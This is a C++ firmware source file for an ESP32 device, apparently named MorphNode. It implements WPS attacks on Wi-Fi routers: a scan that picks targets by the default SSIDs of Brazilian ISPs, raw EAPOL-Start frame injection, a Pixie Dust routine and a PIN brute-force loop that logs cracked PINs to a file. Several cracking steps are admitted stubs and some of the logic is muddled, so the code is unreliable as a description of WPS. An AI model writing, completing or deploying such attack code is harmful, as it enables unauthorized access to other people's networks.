/**
 * @file wps_attacks.cpp
 * @brief Implementação de Ataques WPS
 *
 * Nota: Pixie Dust real requer acesso a E-S1/E-S2 que não são
 * expostos pelo ESP-IDF. Esta é uma implementação best-effort.
 *
 * @author MorphNode Team
 * @date 2026-01-08
 */

#include "wps_attacks.h"
#include "core/aggressive_sd.h"
#include "led_driver.h"
#include "module_manager.h"


// Static member initialization
WPSNetwork WPSAttacks::_networks[20];
int WPSAttacks::_networkCount = 0;
WPSAttackStatus WPSAttacks::_status = WPS_STATUS_IDLE;
WPSNetwork WPSAttacks::_currentTarget;

uint8_t WPSAttacks::_enrolleeNonce[16];
uint8_t WPSAttacks::_registrarNonce[16];
uint8_t WPSAttacks::_enrolleePubKey[192];
uint8_t WPSAttacks::_eHash1[32];
uint8_t WPSAttacks::_eHash2[32];

uint16_t WPSAttacks::_currentPIN = 0;
String WPSAttacks::_discoveredPIN = "";
String WPSAttacks::_discoveredPassword = "";

// ============================================================================
// SCAN WPS
// ============================================================================

int WPSAttacks::scanWPS() {
    Serial.println("[WPS] Scanning for WPS-enabled networks...");

    ModuleManager::ativaModulo(MODULE_WIFI);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    _networkCount = 0;

    for (int i = 0; i < n && _networkCount < 20; i++) {
        // Check if WPS IE is present (simplified check)
        // Real implementation would parse beacon IEs

        // Heuristic: Many routers with default SSIDs have WPS
        String ssid = WiFi.SSID(i);
        bool likelyWPS =
            (ssid.startsWith("VIVO") || ssid.startsWith("NET-") || ssid.startsWith("GVT") ||
             ssid.startsWith("Claro") || ssid.startsWith("TIM") || ssid.indexOf("Fibra") >= 0 ||
             ssid.indexOf("_5G") >= 0);

        if (likelyWPS) {
            strncpy(_networks[_networkCount].ssid, ssid.c_str(), 32);
            _networks[_networkCount].ssid[32] = '\0';

            uint8_t *bssid = WiFi.BSSID(i);
            if (bssid) { memcpy(_networks[_networkCount].bssid, bssid, 6); }

            _networks[_networkCount].rssi = WiFi.RSSI(i);
            _networks[_networkCount].channel = WiFi.channel(i);
            _networks[_networkCount].wpsEnabled = true;
            _networks[_networkCount].wpsLocked = false;

            Serial.printf(
                "[WPS] Found: %s (ch%d, %ddBm)\n",
                _networks[_networkCount].ssid,
                _networks[_networkCount].channel,
                _networks[_networkCount].rssi
            );

            _networkCount++;
        }
    }

    WiFi.scanDelete();

    Serial.printf("[WPS] Found %d WPS networks\n", _networkCount);
    return _networkCount;
}

WPSNetwork WPSAttacks::getNetwork(int index) {
    if (index >= 0 && index < _networkCount) { return _networks[index]; }

    WPSNetwork empty = {0};
    return empty;
}

// ============================================================================
// PIXIE DUST ATTACK
// ============================================================================

bool WPSAttacks::startPixieDust(const WPSNetwork &target) {
    Serial.printf("[WPS] Starting Pixie Dust on %s...\n", target.ssid);

    if (!ModuleManager::ativaModulo(MODULE_WIFI)) { return false; }

    _currentTarget = target;
    _status = WPS_STATUS_PIXIE_ATTEMPT;

    // Initialize WPS exchange
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    // Set channel
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);

    // Generate random nonce
    for (int i = 0; i < 16; i++) { _enrolleeNonce[i] = random(256); }

    // Send EAPOL-Start
    if (!sendEAPOLStart(target.bssid)) {
        Serial.println("[WPS] Failed to start EAPOL");
        _status = WPS_STATUS_FAILED;
        return false;
    }

    return true;
}

bool WPSAttacks::sendEAPOLStart(const uint8_t *bssid) {
    // EAPOL-Start frame
    uint8_t eapolStart[] = {
        // 802.11 Header
        0x88,
        0x01, // Frame Control
        0x3A,
        0x01, // Duration
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00, // DA (AP)
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00, // SA (our MAC)
        0x00,
        0x00,
        0x00,
        0x00,
        0x00,
        0x00, // BSSID
        0x00,
        0x00, // Sequence

        // LLC/SNAP
        0xAA,
        0xAA,
        0x03,
        0x00,
        0x00,
        0x00,
        0x88,
        0x8E,

        // EAPOL
        0x01, // Version
        0x01, // Type (Start)
        0x00,
        0x00 // Length
    };

    // Fill in addresses
    memcpy(&eapolStart[4], bssid, 6); // DA

    // Get our MAC
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    memcpy(&eapolStart[10], mac, 6);   // SA
    memcpy(&eapolStart[16], bssid, 6); // BSSID

    // Send frame
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, eapolStart, sizeof(eapolStart), false);

    return (err == ESP_OK);
}

bool WPSAttacks::tryPixieCalculation() {
    // Pixie Dust exploits weak random number generation in WPS
    // E-S1 and E-S2 are derived from PRF(AuthKey, "E-S1" | E-Nonce)
    // If the router uses predictable random (like time-based),
    // we can recover PSK1/PSK2

    // This is a simplified implementation
    // Real Pixie Dust requires:
    // 1. Capture M1 (get E-Nonce, PKE)
    // 2. Capture M3 (get E-Hash1, E-Hash2)
    // 3. Crack E-S1, E-S2 offline
    // 4. Calculate PSK1, PSK2
    // 5. Derive WPS PIN

    Serial.println("[WPS] Pixie calculation (simplified)...");

    // Most vulnerable routers use timestamp as seed
    // Try common patterns
    uint32_t timestamp = millis() / 1000;

    for (int offset = -60; offset <= 60; offset++) {
        uint32_t seed = timestamp + offset;

        // Simulate random with this seed
        srand(seed);

        uint8_t es1[16], es2[16];
        for (int i = 0; i < 16; i++) {
            es1[i] = rand() & 0xFF;
            es2[i] = rand() & 0xFF;
        }

        // Calculate PSK from E-Hash
        // (Real implementation would use HMAC-SHA256)

        // For demonstration, we can't actually crack without the hashes
        // This would require packet capture of M3
    }

    // Pixie Dust success rate depends heavily on router model
    // Common vulnerable: Ralink, Realtek, Broadcom (older)

    return false; // Simplified version can't actually crack
}

// ============================================================================
// BRUTE FORCE WPS PIN
// ============================================================================

bool WPSAttacks::startBruteForce(const WPSNetwork &target) {
    Serial.printf("[WPS] Starting PIN Brute Force on %s...\n", target.ssid);

    if (!ModuleManager::ativaModulo(MODULE_WIFI)) { return false; }

    _currentTarget = target;
    _status = WPS_STATUS_BRUTE_ATTEMPT;
    _currentPIN = 0;

    return true;
}

uint8_t WPSAttacks::calculateChecksum(uint32_t pin) {
    // WPS PIN checksum algorithm
    uint32_t accum = 0;
    uint32_t t;

    t = pin;
    t = ((t / 10000000) % 10) * 3;
    accum += t;

    t = pin;
    t = ((t / 1000000) % 10);
    accum += t;

    t = pin;
    t = ((t / 100000) % 10) * 3;
    accum += t;

    t = pin;
    t = ((t / 10000) % 10);
    accum += t;

    t = pin;
    t = ((t / 1000) % 10) * 3;
    accum += t;

    t = pin;
    t = ((t / 100) % 10);
    accum += t;

    t = pin;
    t = ((t / 10) % 10) * 3;
    accum += t;

    return (10 - (accum % 10)) % 10;
}

bool WPSAttacks::tryPIN(uint16_t pin) {
    // Build full 8-digit PIN with checksum
    uint32_t pin7 = pin * 10 + calculateChecksum(pin * 10);

    char pinStr[9];
    snprintf(pinStr, sizeof(pinStr), "%08lu", pin7);

    // Attempt WPS connection with this PIN
    // Note: ESP-IDF WPS API doesn't support custom PIN easily
    // This is a demonstration of the algorithm

    Serial.printf("[WPS] Trying PIN: %s\n", pinStr);

    // Real implementation would:
    // 1. Send M1 with this PIN
    // 2. Wait for M2
    // 3. Check if PIN is correct
    // 4. If M2D (fail), move to next PIN

    return false; // Continue bruting
}

// ============================================================================
// UPDATE & STATUS
// ============================================================================

WPSAttackStatus WPSAttacks::update() {
    switch (_status) {
        case WPS_STATUS_PIXIE_ATTEMPT:
            // Check for captured M3
            if (tryPixieCalculation()) {
                _status = WPS_STATUS_SUCCESS;
                LEDDriver::blinkSuccess();
            }
            break;

        case WPS_STATUS_BRUTE_ATTEMPT:
            // Try next PIN
            if (!tryPIN(_currentPIN)) {
                _currentPIN++;

                // WPS has 11000 possible first-half combinations
                if (_currentPIN >= 11000) {
                    _status = WPS_STATUS_FAILED;
                    LEDDriver::blinkError();
                }
            } else {
                _status = WPS_STATUS_SUCCESS;
                _discoveredPIN = String(_currentPIN);
                LEDDriver::blinkSuccess();

                // Log success
                char log[128];
                snprintf(
                    log, sizeof(log), "WPS SUCCESS: %s PIN=%s\n", _currentTarget.ssid, _discoveredPIN.c_str()
                );
                AggressiveSD::appendFile("/wps_cracked.log", log);
            }
            break;

        default: break;
    }

    return _status;
}

void WPSAttacks::stop() {
    _status = WPS_STATUS_IDLE;
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    Serial.println("[WPS] Attack stopped");
}

WPSAttackStatus WPSAttacks::getStatus() { return _status; }

String WPSAttacks::getDiscoveredPIN() { return _discoveredPIN; }

String WPSAttacks::getDiscoveredPassword() { return _discoveredPassword; }

uint16_t WPSAttacks::getBruteProgress() { return _currentPIN; }
